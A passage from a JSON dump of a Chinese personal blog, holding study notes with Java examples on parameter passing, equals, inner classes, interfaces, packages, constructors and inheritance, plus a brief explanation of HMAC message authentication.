📒按引用传递:当将一个参数传递给一个函数时，函数接收的原始值的内存地址，而不是值的副本，因此，如果修改了该参数，调用代码中的原始值也随之改变。(传递对象,接口,数组)Java中的参数传递比C++简单,按值传递所有参数,制作所有参数的副本,而不管它们的类型。\n\n例1：\nclass TestTransOfValue\n{\n  public static void main(String args[])\n  {\n    int val;\n    StringBuffer sb1, sb2;\n    val = 10;\n    sb1 = new StringBuffer(\"apples\");\n    sb2 = new StringBuffer(\"pears\");\n    System.out.println(\"val is \" + val);\n    System.out.println(\"sb1 is \" + sb1);\n    System.out.println(\"sb2 is \" + sb2);\n    System.out.println(\"\");\n\nSystem.out.println(\"calling modify\");\n    //按值传递所有参数\n    modify(val, sb1, sb2);\n    System.out.println(\"returned from modify\");\n    System.out.println(\"\");\n    System.out.println(\"val is \" + val);\n    System.out.println(\"sb1 is \" + sb1);\n    System.out.println(\"sb2 is \" + sb2);\n  }\n\npublic static void modify(int a, StringBuffer r1,\n                         StringBuffer r2)\n  {\n    System.out.println(\"in modify...\");\n    //在方法中修改基本类型变量的值\n    a = 0;  \n    //在方法中修改对象引用值的副本\n    r1 = null;  //1\n    //在方法中修改副本的对象实体值\n    r2.append(\" taste good\");\n    System.out.println(\"a is \" + a);\n    System.out.println(\"r1 is \" + r1);\n    System.out.println(\"r2 is \" + r2);\n  }\n}\n运行后输出：\nval is 10\nsb1 is apples\nsb2 is pears\ncalling modify in modify...\na is 0\nr1 is null\nr2 is pears taste good \nreturned from modify\nval is 10\nsb1 is apples\nsb2 is pears taste good \n/*关于这里的sb1和r1：\n当参数传到modify后，r1和sb1指向同一个地址，若改变了r1指向的地址，并不会更改sb1指向的地址。这个时候就\n相当于看作两个指针了。\n关于sb2和r2：\nsb2和r2指向同一个地址，这个地址指向的值(实体值)被改变了，则结束后sb2和r2的实体值也就相应的改变了。\n*/\n\n\n例2：\nclass Swap\n{ \n public static void main(String args[])\n  {\n    Integer a, b;\n    a = new Integer(10);\n    b = new Integer(50);\n    System.out.println(\"before swap...\");\n    System.out.println(\"a is \" + a);\n    System.out.println(\"b is \" + b);\n    swap(a, b);\n    System.out.println(\"after swap...\");\n    System.out.println(\"a is \" + a);\n    System.out.println(\"b is \" + b);\n}\n\n public static void swap(Integer a, Integer b)\n  {\n    Integer temp = a;\n    a = b;\n    b = temp;\n    System.out.println(\"in swap...\");\n    System.out.println(\"a is \" + a);\n    System.out.println(\"b is \" + b);\n  }\n}\n/*\n运行后输出：\nbefore swap...\na is 10\nb is 50\nin swap…\na is 50\nb is 10\nafter swap...\na is 10\nb is 50 \n*/\n\n参数传递总结： (1) Java按值传递所有参数,制作所有参数的副本,而不管它们的类型 (2) 对于基本类型的变量形参修改了并不能反映到函数外面的实参 (3) 对于引用类型的变量，在形参中修改了对象实体值可以反映到实参，在形参中修改了对象引用值，     不能反映到实参\n\n\n&emsp;&emsp;\n1.4  引用型变量的实体值、引用值比较1. 📒参数传递总结： (1) 比较基本类型的数据: ==和!= (2) 如果要比较引用型变量是否相同,可以直接用==和!=吗?  答：不能==和!=用来比较引用型变量时（只能比较引用值（地址）是不是相等）,只能判断运算符两边引用的是不是同一个对象,即对象的地址值（或对象引用值）！！！！！如何比较两个对象的内容(对象实体值)是否相同?用equls()方法：\n\n2. 📒引用型变量比较总结： (1) 比较两个变量是否同一个对象（即对象引用值是否相同），用==和!= (2) 比较两个变量的内容是否相同用equals方法 (3) 自己定义的类如果要支持equals方法必须重写从Object类继承来的equals方法(比如前面的String类 是java自己的类就不需要重写equals，但是Employee类就是自己定义的类则需要重写equals)Object类中的equals方法： public boolean equals(Object obj){   return (this==obj); }\n\nequals示例1:\nclass EqualsTest{\n  public static void main(String[] arguments)\n  {\n     String str1,str2;\n     str1=\"Free the bound periodicals.\";\n     str2=str1;\n     System.out.println(\"String1: \"+str1);\n     System.out.println(\"String2: \"+str2);\n     System.out.println(\"Same object? \"+(str1==str2));      //true\n     str2=new String(str1);\n     System.out.println(\"String1: \"+str1);\n     System.out.println(\"String2: \"+str2);\n     System.out.println(\"Same object? \"+(str1==str2));      //false\n     System.out.println(\"Same value? \"+str1.equals(str2));  //true\n     String str3,str4;\n     str3=\"busy\";\n     str4=\"busy\"; //str4=new String(\"busy\")或str4=new String(str3) \n     System.out.println(\"String3: \"+str3);\n     System.out.println(\"String4: \"+str4);\n     System.out.println(\"Same object? \"+(str3==str4));       //true\n     System.out.println(\"Same value? \"+str3.equals(str4));   //true \n     String str5,str6;\n     str5=\"str5busy\";\n     str6=\"str6busy\";\n     System.out.println(\"String5: \"+str5);\n     System.out.println(\"String6: \"+str6);\n     System.out.println(\"Same object? \"+(str5==str6));      //false\n     System.out.println(\"Same value? \"+str5.equals(str6));  //false     \n   }\n}\n\nequals示例2：\nimport java.util.*;\npublic class EqualsTest {\n     public EqualsTest() {    }    \n     public static void main(String[] args){\n     Employee alice1=new Employee(\"Alice\",75000,1987,12,15);\n     Employee alice2=alice1;\n     Employee alice3=new Employee(\"Alice\",75000,1987,12,15);\n     Employee bob=new Employee(\"Bob\",50000,1989,10,1);\n     System.out.println(\"alice1==alice2: \"+(alice1==alice2));    //true\n     System.out.println(\"alice1==alice3: \"+(alice1==alice3));    //false \n     System.out.println(\"alice1.equals(alice3): \"+alice1.equals(alice3));  //true\n     System.out.println(\"alice1.equals(bob): \"+alice1.equals(bob));   //false \n     System.out.println(\"bob.toString(): \"+bob);  \n  }\n}\n\nclass Employee{\n    private String name;\n    private double salary;\n    private Date hireDay; \n    public Employee(String n,double s,int year,int month,int day){\n            name=n;\n            salary=s\n        hireDay=new Date(year,month,day);\n    }\n    public String getName(){     return name;     }\n    public double getSalary(){   return salary;    }\n    public Date getHireDay(){   return hireDay; }\n    public void raiseSalary(double byPercent){\n            double raise=salary*byPercent/100;\n            salary+=raise;\n }\n\npublic boolean equals(Object otherObject){     //子类覆盖了Object的equals方法\n  if(this==otherObject) return true;\n  if(otherObject==null) return false;\n  if(getClass()!=otherObject.getClass())\n  return false;\n  Employee other=(Employee)otherObject;\n  return name.equals(other.name)&amp;&amp;\n              salary==other.salary&amp;&amp;hireDay.equals(other.hireDay); \n                        //子类覆盖了Object的toString方法\n }\n public String toString(){\n  return getClass().getName()+\n           \"[name=\"+name+\",salary=\"+salary+\",hireDay=\"+hireDay+\"]\";\n }\n private String name;\n private double salary;\n private Date hireDay;\n}  \n\n&emsp;&emsp;\n二、 内部类2.1  内部类的定义与使用1. 📒内部类的定义：将类的定义置入一个用于封装它的类（外部类）里。    注意：    内部类不能与外部类同名（否则，编译器无法区分内部类与外部类），如果内部类还有内部类，内部类的内部类不能与它的任何一层外部类同名。    作用：    逻辑分组, 隐藏细节\n\n/*内部类结合多态可以很方便的隐藏类的细节(包括类名)\n*/\ninterface Contents{\n  int value();\n}\ninterface Destination {\n  String readLabel();\n}\nclass Goods{\n    private class Content implements Contents{  //\"private class Contentimplements Contents\" \n        private int i=11;\n        public int value(){\n  return i;\n    }\n  }\n    protected class GDestination    //\"protected class GDestination implements Destination\"\n    implements Destination{\n      private String label;\n  private GDestination(String whereTo){\n    label=whereTo;\n  }\npublic String readLabel(){\n    return label;}}\npublic Contents cont(){\n  return new Content();\n  }\npublic Destination dest(String s){\n  return new GDestination(s);\n  }\n  }\npublic class TestGoods {   //\"public class TestGoods\"\n    public static void main(String[] args){\n         Goods g=new Goods();\n         Contents c=g.cont();\n         Destination d=g.dest(\"Beijing\");\n    }\n}\n\n2. 📒内部类对象的创建：创建非静态内部类的对象时一定要确保已经有一个外部类对象。(1) 利用外部类的方法创建并返回，因为方法是由外部类对象调用的，那创建该内部类对象时，一定已经拥有了所属的外部类对象了public Contents cont(){  &emsp;&emsp;&emsp;&emsp;       Goods g=new Goods();  return new Content();  &emsp;&emsp;&emsp;&emsp;&ensp;        Contents c=g.cont();}(2) 创建内部类还可以在除外部类中的其它类中，但是要确保该类具有访问内部类的权限，并且已经创建了一个外部类对象。格式如下：\n\nouterObject=new outerClass(Constructor Parameters);\nouterClass.innerClass innerObject = outerObject.new InnerClass(Constructor Parameters);\n\n Goods g1=new Goods();\n Goods.Content c1=g.new Content(); \nOR\n Goods g1=new Goods();\n Goods.GDestination d1=g1.new GDestionation(); \n\n&emsp;\n3. 📒内部类的修饰符：（1）public、protected、private和缺省：访问权限修饰符，用来限定内部类的访问权限，  &emsp;&emsp;一般的外部类是不能用protected和private修饰的。访问权限修饰符的限定和成员变量的限定一样。（2）final:表明内部类不能继承。（3）abstract：抽象内部类，不能被实例化。（4）static：表明一个静态内部类。4. 📒静态内部类：和普通的非静态内部类有较大的不同，使用时要遵循如下原则：（1）实例化static内部类时，在new前面不需要用对象变量；（2）static内部类中不能访问其外部类的非static属性及方法，即只能访问static成员；（3）static方法中不能访问非static的属性及方法，也不能不带前缀地new一个非static的内部类。\n\nclass A\n{\n      private int x;\n      void m(){\n  new B();\n     }\n\n     static void sm(){\n      //在外部类的静态方法中\n     //不能直接创建内部类对象\n     //new B();//!!error\n    }\nclass B\n{\n      B(){x=5;}\n  }//B类结束\n}//A类结束\nclass Outer\n{\n  static class Inner\n  {\n  }\n}\n\nclass TestInnerStatic\n{\n  public static void main(String[] args)  \n  {\n    //创建非静态内部类B的对象a_b和ab\n    A.B a_b=new A().new B();\n    A a=new A();\n    A.B ab=a.new B();\n\n    //创建静态内部类Inner的对象oi，不需要外部类Outer的对象\n    Outer.Inner oi=new Outer.Inner();\n    //Outer.Inner oi2=Outer.new Inner();//!!error\n    //Outer.Inner oi3=new Outer().new Inner();//!!error\n  }\n}\n\n&emsp;\n5. 📒内部类中访问外部类的成员：(1) 内部类中是可以直接访问外部类的其他属性与方法的，即使它们是private的。(2) 如果内部类中有与外部类同名的属性与方法，可以使用下面的格式来表达外部类的引用，从而区分外部类和内部类的同名的属性与方法：                       outerClass.this \n\n&emsp;&emsp;\n2.2  方法和作用域中的内部类内部类也可以是局部的，它可以定义在一个方法甚至一个代码块之内。(1) 内部类中是可以直接访问外部类的其他属性与方法的，即使它们是private的。(2) 如果内部类中有与外部类同名的属性与方法，可以使用下面的格式来表达外部类的引用，从而区分外部类和内部类的同名的属性与方法：                       outerClass.this \n\n例1: 方法中的内部类:\ninterface Destination {\n  String readLabel();\n}\n\npublic class Goods2 {\n  String a=\"Goods2\";\n     public Destination dest(String s) {\n          class GDestination implements Destination {\n            private String label;\n            private GDestination(String whereTo) {\n             label = whereTo;\n             System.out.println(\"access outer class:\"+a);\n               }\n               public String readLabel() { return label; }\n          }\n          return new GDestination(s);\n     }\npublic static void main(String[] args) {\n          Goods2 g= new Goods2();\n          Destination d = g.dest(\"Beijing\");\n          }\n}\n/*在方法dest（）中定义了一个内部类，最后由这个方法返回这个内部类的对象。如果在用一个内部类的时候仅需要创建它的一个对象并传给外部，就可以这样做。\n*/\n\n&emsp;\n方法中定义内部类的注意点: (1) 方法中定义的类，在其它地方使用时，没有类的名字，一般用其父类来引用这样的变量。 (2) 同局部变量一样，方法中的内部类前面不能用public，private，protected修饰，也不能用static修饰，但可以被final或abstract修饰。 (3) 方法中的内部类，可以访问其外部类的成员;若是static方法中的内部类，可以访问外部类的static成员。 (4) 方法中的内部类中，不能访问该方法的局部变量，除非是final的局部变量。\n\n&emsp;\n例2: 作用域中的内部类:\npublic class Goods3{\n     private void internalTracking(boolean b) {\n          if(b) {\n               class TrackingSlip {\n                    private String id;\n                    TrackingSlip(String s) {\n                         id = s;\n                    }\n                    String getSlip() { return id; }\n               }\n              TrackingSlip ts = new TrackingSlip(\"slip\");\n               String s = ts.getSlip();\n          } \n     }\n public void track() { internalTracking(true); }\n     public static void main(String[] args) {\n          Goods3 g= new Goods3();\n          g.track();\n     }\n}\n\n&emsp;&emsp;\n2.3  匿名内部类 匿名类： 类或方法中定义的一种没有类名的特殊内部类。作用：当需要创建一个类的对象而且用不上它的名字时，使用内部类可以使代码看上去简洁清楚。语法规则如下：       new interfacename(){……};      或new superclassname(){……};注意： (1) 这种类不取名字，而直接用其父类的名字或者它所实现的接口的名字； (2) 类的定义与创建该类的一个对象同时进行，即类的定义前面有一个new，没有类的首部，对象的创建和类体共同构成一个匿名类表达式，后面以“;”结束； (3) 类中不能定义构造方法，因为它没有名字。\n\ninterface Contents{\n  int value();\n}\npublic class Goods4 {\n     public Contents cont(){\n          //返回匿名类对象，该匿名类继承了Contents接口\n          return new Contents(){\n               private int i = 11;\n               public int value() { \n                    return i; \n               }\n          };\n     }\n public static void main(String[] args)\n     {\n      Goods4 g=new Goods4();\n      Contents c=g.cont();\n     }\n}\n\n\n\n&emsp;&emsp;&emsp;&emsp;\n","thumbnail":"https://i.loli.net/2018/12/27/5c24f015bda37.jpg","plink":"https://Directoree.github.io/post/Java-Variable-InnerClass6/"},{"title":"Java接口、包(4.7-4.8)","date":"2018-12-26T14:16:53.000Z","updated":"2019-03-05T11:46:37.183Z","content":"&emsp;&emsp;\n接口 &amp; 包\n\n&emsp;\n一、 接口1.1  接口的概念1.  📒使程序设计和实现相互分离：在单继承的继承树中，设计和实现不可避免地要纠缠在一起。在设计的时候，人们也许只想提供一个类的抽象的接口，而不希望去具体实现它，因为那是实现阶段的事情。使用接口类型可以很完美地解决这个问题。2.📒弥补Java只支持单重继承的不足：   Java的类型层次结构具有一定的局限——它只支持单继承，一个类只能有一个父类，而不能交叉继承树的其它分支中有用的部分。这样就给面向对象的程序设计带来了一些困难。但是多继承的引入使得继承层次结构变得混乱，更加容易出错和产生二义性。3.📒约束实现接口的类:接口只是约束实现了该接口的类必须满足接口的要求。当定义一个接口时，实际上是在编写一个契约，用来描述实现其的类能够做什么，能够充当什么角色，具体怎么做和接口无关。所以，Java抛弃了多继承，引入一种新的层次结构——接口来达到同样的功能。\n\n\n📒接口和类的区别：  (1) 类只能单继承，而接口可以多继承。 (2) 类中的方法可以是具体的，也可以抽象的。 接口中的方法都是抽象的。 (3) 接口中的方法要用类来实现，一个类可以实现多个接口。📒注意：   (1) 接口可以继承：一个接口可以继承多个其它的接口， (2) 接口中的方法要用类来实现 。 (3) 一个类可以实现多个接口 。 (4) Java接口反映了对象较高层次的抽象，为描述相互似乎没有关系的对象的共性提供了一种有效的手段。\n\n&emsp;&emsp;\n1.2  接口的说明[修饰符] interface 接口名[extends] [接口列表]\n{\n   接口体\n}\n\n&emsp;\n1.  📒首部：修饰符：或者不使用修饰符（同包访问），或者只能使用public（任意访问）。归结为只能使用public或者缺省.extends：定义父接口，支持多重继承(多个父接口用逗号分隔)&emsp;&emsp;&emsp;&emsp;public interface Cookable extends Foodable,Printable2.📒接口体：定义常量和抽象方法：&emsp;接口的成员：成员变量和方法(1) 接口中的成员变量：都是隐含public、static、final的——静态最终变量（常量），例如在接口中有下面这行代码：int STEP=5;等同于：public static final int STEP=5;(2) 接口中的方法：接口中说明的方法都是抽象方法，所有方法隐含public和abstract的 ，例如 int increment(int x)；注意， 接口中的方法不能使用下面的修饰符：     static     native或synchronized     final\n\n&emsp;&emsp;\n1.3  接口的使用&emsp;接口自己不能提供方法的实现，接口中的方法必须由类实现。Java语言用关键字implements声明类中将实现的接口。声明接口的形式：&emsp;&emsp;[类修饰符]  class类名  [extends子句]  [ implements 子句]注意：在implements子句中可以包含多个接口类型，各个接口类型之间用逗号隔开。\n\n[例4-19]  TestInterface.java 接口的使用示例\ninterface Runner{ public void run();}\ninterface Swimmer{ public void swim();}\nabstract class Animal {abstract public void eat();}\n\nclass Person extends Animal implements Runner,Swimmer {\n//Person是能跑和游泳的动物，所以继承了Animal，同时实现了Runner和Swimmer两个接口\n    public void run() {System.out.println(\"run\");}\n    public void swim(){System.out.println(\"swim\");}\n    public void eat(){System.out.println(\"eat\");}\n}\npublic class TestInterface{\n    public static void main(String args[]){\n        TestInterface t=new TestInterface();\n        Person p=new Person();\n        t.m1(p);\n        t.m2(p);\n        t.m3(p);\n    }\n    public void m1(Runner f){f.run();}\n    public void m2(Swimmer s){s.swim();}\n    public void m3(Animal a){a.eat();}\n}\n\n&emsp;&emsp;\n1.4  对接口的引用&emsp;(1) 接口可以作为一种引用类型来使用。任何实现该接口的类的实例都可以存储在该接口类型的变量中，通过这些变量可以访问类所实现的接口中的方法。Java运行时系统动态地确定该使用哪个类中的方法。&emsp;(2) 把接口作为一种数据类型可以不需要了解对象所对应的具体的类，而着重于它的交互界面。例如，[例4-18]中Person类实现了Runner接口，可以如下赋值，和子类对象赋给父类对象是类似的：          Runner r=new Person();\n\n&emsp;&emsp;\n1.5  使用接口实现多重继承&emsp;程序设计有时需要表达这样的意思：&emsp;&emsp; “x从属于a，也从属于b，也从属于c” C++：多重继承，每个类都有具体的实施细节Java：接口，只有一个类有具体的实施细节\n\n\n[例4-20]  Swan.java 接口实现多重继承\n/* Swan表示天鹅类，它继承了animal基础类，并实现了接口canWalk、canSwim、canFly，即天鹅具有\nanimal的功能，同时也具有行走、游泳和飞行的功能。这就实现了多重继承。\n*/\ninterface canWalk{   void walk();}\ninterface canSwim{ void swim();}\ninterface canFly{void fly();}\nabstract class animal{abstract void eat();}\npublic class Swan extends animial implements canWalk,canSwim,canFly\n{    public void walk()\n     { System.out.println(\"swan walking!\");\n     }\n    public void swim()\n     { System.out.println(\"swan swimming!\");}\n    public void fly()\n     { System.out.println(\"swan flying!\");}\n    void eat(){ System.out.println(\"swan eating!\");}\n\n    public static void main(String[] args)\n    {\n        Swan swan=new Swan();\n        swan.walk();\n        swan.swim();\n        swan.fly();\n        swan.eat();\n    }\n}\n\n&emsp;&emsp;\n1.6  抽象类和接口的选择问题：接口和抽象类都可以使设计和实现分离，那么继承结构中的基础类应该定义成一个普通类、抽象类还是接口 ？？(1) 在语法上都是可以的，但是把基础类定义成抽象类或接口往往会增加程序的灵活性和容错性；(2) 如果基础类只是定义一些接口，根本不需要具体的实现， 那么首先优先选择使用接口，接口的抽象程度比抽象类更高；如果基础类必须实现方法或者定义成员变量的时候，才考虑采用抽象类。\n\n&emsp;&emsp;\n1.7  多态📒多个类中的多态：在具有继承关系的多个类中，子类对父类方法的覆盖（不能是重载父类的方法），即子类和父类可以有相同首部的方法，运行的时间决定每个对象到底执行哪个特定的版本。📒判断程序中是否存在多态：继承(覆盖)、向上转型、动态绑定。\n\n&emsp;1. 覆盖：前面已经讲过，如下：\n[例4-21] Shapes.java 多态性示例1\nclass Shape { \n  void draw() {}\n  void erase() {} \n}\nclass Circle extends Shape {\n  void draw() { \n    System.out.println(\"Circle.draw()\"); }\n  void erase() { \n    System.out.println(\"Circle.erase()\"); \n  }}\nclass Square extends Shape {\n  void draw() { \n    System.out.println(\"Square.draw()\");  }\n  void erase() { \n    System.out.println(\"Square.erase()\"); \n  }}\npublic class Shapes {\n static void doShape(Shape s){\n  s.draw();\n  s.erase();  }\n  public static void main(String[] args) {\n    Circle c=new Circle();\n    Square s=new Square();\n    doShape(c);\n    doShape(s);\n  }}\n运行结果：\nCircle.draw()\nCircle.erase()\nSquare.draw()\nSquare.erase() \n\n&emsp;&emsp;2. 向上转型：子类对象可以直接转换成父类对象，即一个对象除了可以当作自己的类型，还可以作为它的基础类型对待，这种把子类型当作它的基本类型处理的过程，就叫作向上转型（即“Upcasting”）例如：Shape s=new Circle();Circle c=new Circle();Square s=new Square();doShape(c);doShape(s);\n&emsp;3. 动态绑定：&emsp;&emsp;绑定：将一个方法调用同一个方法体连接起来&emsp;&emsp;早期绑定：程序运行以前执行绑定；&emsp;&emsp;动态绑定（或后期绑定）：在运行期间执行绑定。\nJava支持动态绑定：能在运行期间判断参数的实际类型，并分别调用适当的方法体，从而实现了多态性。在Java中所有非final和非static的方法都会自动地进行动态绑定。\n\n如下代码块：\nclass Shape { \n  void draw() {}\n  void erase() {} \n}\nclass Triangle extends Shape {\n  void draw() { \n    System.out.println(\"Triangle.draw()\"); }\n  void erase() { \n    System.out.println(\"Triangle.erase()\");  }\n}\npublic class Shapes \n{ \n static void doShape(Shape s)\n {\n     s.draw();\n     s.erase();     \n }\n  public static void main(String[] args) \n  {\n    Circle c=new Circle();\n    Square s=new Square();\n    Triangle t=new Triangle();\n    doShape(c);\n    doShape(s);\n    doShape(t) ;\n  }\n}\n\n&emsp;&emsp;\n二、 包2.1  包的说明和作用1. 📒包的说明：•    包是用于组织类的一种方式，可以对类进行分组，一个包中可以包含任意数量的类和接s口,本身是一种命名机制，具体的表现就是一个文件夹•    包是一种松散的类的集合：一般不要求处于同一个包中的类有明确的相互关系，如包含、继承等，但是由于同一个包中的类在默认情况下可以相互访问，所以为了方便编程和管理，通常把需要在一起工作的类放在一个包里。2. 📒包的作用：（1）包能够让程序员将类组织成单元，通过文件夹或目录来组织文件和应用程序；（2）包减少了名称冲突带来的问题，可以防止同名的类发生冲突；（3）包能够更大面积的保护类、变量和方法，而不是分别对每个类进行保护；（4）包可以用于标示类。\n\n&emsp;&emsp;\n2.2  包的创建1. 📒无名包：&emsp;&emsp;系统为每个没有明确指明所属包的.java文件默认创建的包&emsp; &emsp; 无名包中的类无法被引用和复用\n\n2. 📒有名包：     （1）说明格式   package 包名；       &emsp;&emsp; package SubClass;       &emsp;&emsp; package MyClass.SubClass;     （2）说明语句必须放在整个.java文件的第一行 \n3. 📒创建包的含义：      &emsp;创建包就是在当前文件夹下创建一个子文件夹，以便存放这个包中包含的所有类的.class文件.\n4. 📒可以在不同的文件中使用相同的包说明语句，这样就可以将不同文件中的类都包含到相同的程序包中.\npackage SubClass;         package MyClass.SubClass;\nclass s1{                 class s2{\n……                        ……\n }                         }\n\n&emsp;&emsp;\n2.3  包的引用1. 📒使用全名引用：&emsp;(1) 同包的类相互引用时：&emsp;&emsp;&emsp;      在使用的属性或方法名前加上类名作为前缀即可.&emsp;(2) 不同包中的类相互引用时：&emsp;&emsp;&emsp;      在类名的前面再加上包名——类的全名.&emsp;&emsp;&emsp;      例如：Class myDate extends java.util.Date{&emsp;&emsp;&emsp;      java.util.Date d=new java.util.Date();&emsp;&emsp;&emsp;      ……&emsp;&emsp;&emsp;       }2. 📒使用import：&emsp;&emsp;import可以加载整个包中的文件或包中的某一个文件。import语句的格式为：&emsp;&emsp;&emsp;&emsp;import package1[.package2…].(classname|*);\n\nimport java.awt.*;\nimport java.awt.event.*; \nimport java.util.Date; \nimport java.awt.*;\nimport java.awt.event.*; \nimport java.util.Date; \nimport java.util.Date;\nclass myDate extends Date{\n         Date d=new Date();\n……\n}\n\n注意：java编译器会为所有程序自动引入包java.lang，因此不必用import语句引入它包含的所有的类，但是若需要使用其他包中的类，必须用import语句引入。\n\n&emsp;&emsp;\n2.4  编译和运行包中的类当程序中用package语句指明一个包，在编译时产生的字节码文件（.class文件）需要放到相应的以包名为名称的文件夹目录下：   （1）手工建立子目录，以包名命名该目录，再将.class文件复制到相应目录下。   （2）在编译时，使用“javac –d”命令\n\n&emsp;&emsp;\n2.5  Java包&emsp;&emsp;Java自带了一些包。这些包以“java.”开头，作为java的一个标准部分发布。学习Java，必须学习Java常用包中的类。从第六章开始，主要内容是介绍Java常用包的使用。\n包的使用参考。输入流的使用参考。&emsp;&emsp;&emsp;&emsp;\n","thumbnail":"https://i.loli.net/2018/12/26/5c2390274f7fc.jpg","plink":"https://Directoree.github.io/post/Java-Interface-Package5/"},{"title":"Hash函数和消息认证","date":"2018-12-26T12:59:42.000Z","updated":"2018-12-28T07:12:10.198Z","content":"&ensp;&ensp;\nHash函数  &amp; 消息认证\n\n&ensp;&ensp;\n一、 Hash函数结构、MD5、SHA-1\n&ensp;&emsp;\n二、 消息认证&emsp;消息认证是一个过程，用以验证接收消息的真实性（的确是由它所声称的实体发来的）和完整性（未被篡改、插入、删除），同时还用于验证消息的顺序性和时间性（未被重排、重放、延迟等）。认证分为：实体认证、消息认证。\n\n&ensp;\n1.1  消息认证码消息认证码：(MAC，Message Authentication Code)或报文认证码，是用于提供数据源认证和数据完整性的密码校验值。MAC：是指消息被一密钥控制的公开函数作用后产生的、用作认证的、固定长度的数值，也称为密码校验和。\n\n\n&emsp;&emsp;\n1.2  基于DES和Hash函数的消息认证码消息认证码的构造主要有两种：基于分组密码、基于带密钥的Hash函数-HMAC。\n 1. 基于DES的消息认证码：将需要认证的消息和密钥K经过16轮迭代后生成该消息认证码。\n\n\n 2. 基于Hash函数的消息认证码HMAC：HMAC生成的过程使用了2次Hash函数。\n\n\n描述：(1) K的左边填充0以产生一个b比特长的K+ （例如Ki的长为160比特，b=512，则需填充44个零字节0x00）(2) K+与ipad 逐比特异或以产生b比特的分组Si(3) 将M附于Si后(4) 将哈希函数H作用于步骤(3)产生的数据流(5) K+与opad逐比特异或,以产生b比特长的分组S0(6) 将步骤(4)得到的杂凑值链接在S0后(7) 将H作用于步骤(6)产生的数据流并输出最终结果HMAC\n\n\n\n&emsp;&emsp;&emsp;&emsp;\n","thumbnail":"https://i.loli.net/2018/12/26/5c23997cdd19c.jpg","plink":"https://Directoree.github.io/post/Hash-Message-Authentication/"},{"title":"Java构造方法、对象创建、继承(4.5-4.6)","date":"2018-12-24T16:15:10.000Z","updated":"2019-03-05T11:28:21.957Z","content":"&ensp;&ensp;\n继承\n\n&ensp;&ensp;\n一、 构造方法📒定义： 构造方法是一种特殊的、与类同名的方法，专门用于创建对象，完成初始化工作。 \n\n&emsp;\n📒构造方法的特殊性：(1)构造方法的方法名与类名相同。(2)构造方法没有返回类型，也不能写void。(3)构造方法的主要作用是完成对类对象的初始化工作。(4)构造方法一般不能由编程人员显式地直接调用，而是用new来调用。(5)在创建一个类的新对象的同时，系统会自动调用该类的构造方法为新对象初始化。(6)在Java中，每个类都至少有一个构造方法，如果没有显示地定义构造方法，Java   会自动提供一个缺省的构造方法。\n\n&emsp;&emsp;\n1.1  构造方法说明📒构造方法说明形式如下：[构造方法修饰符] 方法名（[形式参数列表]）[throws异常列表] {方法体} \n\n📒当构造一个类的实例时，编译器主要完成以下3件事情：(1) 为对象分配内存空间(堆)；(2) 按缺省值初始化对象中的实例变量的值；(3) 调用对象的构造方法(可以在构造方法中初始化其他的值)；(4) 对象变量都是引用型变量。\n\n&emsp;&emsp;\n1.2  构造方法的重载(1)  缺省的构造方法：如果没有定义构造方法，则Java自动提供了一个缺省的构造方法，如下：public Person(){}；//对象成员变量的初值按Java规定(2)  带参数的构造方法：按需要将一些指定的参数传递给构造方法 例如：public Person(String n){Name=n;}📒定义构造方法注意：&emsp;只要类中显式定义了一个或多个构造方法，而且所有显式定义的构造方法都带参数，那么将失去缺省   构造方法。\n\nPersonC(String n ,int a){\n   name=n;\n   age=a;\n   System.out.println(\"The Person's name is \"+name+\",age is \"+age);} \n public static void main(String args[]){\n      PersonC per1=new PersonC();\n      PersonC per2=new PersonC(\"wang li\");\n      PersonC per3=new PersonC(\"li ming\",24);\n    }\n}\n\n&emsp;&emsp;\n1.3  对象的创建1.3.1 📒对象说明：对象说明的语法形式为：&emsp;&emsp;&emsp;类名&emsp;对象名；1.3.2. 📒对象的实例化和初始化:对象构造的语法形式为：&emsp;&emsp;&emsp;对象名=new 类构造方法名([实参表]);由new操作符和相应的构造方法完成：new以类为模板，开辟空间并执行相应的构造方法，完成对象的实例化和初始化，并返回该对象的一个引用（即该对象所在的内存首地址)\n\n&emsp;&emsp;\n1.4  this的使用1.4.1 📒使用this来访问成员变量及方法在方法及构造方法中，可以使用this来访问对象的属性和方法 .1.4.2. 📒构造方法中，用this调用另一构造方法：1.4.3. 📒使用this的注意事项：(1)通过this不仅可以引用该类中定义的变量和方法，还可以引用该类的父类中定义的成员变量和方法。(2)在所有的非static方法中，都隐含了一个参数this。而static方法中，不能使用this。\n\n1.4.1\n Person(String n,int a){\n        name=n;\n        age=a;\n    } \n等价于如下：\n Person(String name,int age)\n           {this.name=name;\n             this.age=age;\n}\n\n1.4.2 \n Desk(){   Color=\"\";\n           Length=0;\n         Width=0;\n         Height=0;} \n Desk(String C,int L,int W,int H)\n  {Color=C;\n     Length=L;\n   Width=W;\n   Height=H;} \n Desk(){\n    this(\"\",0,0,0);}\n\n&emsp;&emsp;\n二、 继承2.1  类继承语法形式2.1.1 📒类继承语法形式如下：&emsp;&emsp;class&emsp;SubClassName&emsp;extends&emsp;SupperClassNameextends：继承关键词SubClassName：新的子类名SupperClassName：继承的父类名，必须有且只能一个（即每个子类有且只能有一个父类）2.1.2 📒子类的特性:(1) 子类拥有其父类的所有属性和方法。但父类中说明为private的属性和方法，子类不可直接访问。(2) 子类可以对父类的方法覆盖或重载。\n\n&emsp;&emsp;\n2.2  属性的继承、隐藏和添加注意：属性叫隐藏，方法叫覆盖\n2.2.1 📒属性的继承：• 子类可以继承父类的所有属性（只要该属性没有private修饰）• 通过属性的继承，子类不需要把父类属性的定义部分重复定义一遍，这样做的好处是减少程序维护的工作量。例如：ColorPoint类自动具有Point类的坐标a,b属性&emsp;2.2.2 📒属性的隐藏：子类重新定义一个与父类那里继承来的成员变量完全相同的变量，就称作属性的隐藏。\n\n class living\n{   public int age; }\nclass human extends living\n{   public int age; //将父类的age隐藏\n    public static void main(String args[])\n   { human h1=new human(); h1.age=20;}\n}\n\n&emsp;\n2.2.3 📒属性的添加：在定义子类时，加上的新的属性变量，就可以使子类比父类多一些属性例如：ColorPoint类比父类Point多了一个属性，颜色（color）\n\n&emsp;&emsp;\n2.3  方法的继承、覆盖、重载和添加2.3.1 📒方法的继承：父类的非私有方法也可以被子类自动继承。例如类A具有method()方法，那它的子类B不定义该方法也同样拥有method()。\n\n&emsp;\n2.3.2 📒方法的覆盖：\n\n方法的覆盖(方法用覆盖这个词修饰，属性用隐藏这个词来修饰)覆盖：在子类中定义的方法和父类中的方法的首部是一样的，包括方法名、参数列表、返回类型和异常抛出。但方法体的实现改变了。例如:\n\nclass A{\n……\nint method(int x, int y)\nthrows Exception{\n……\n}\n……\n}\n\nclass B extends A{\n……\nint method(int x, int y) throws  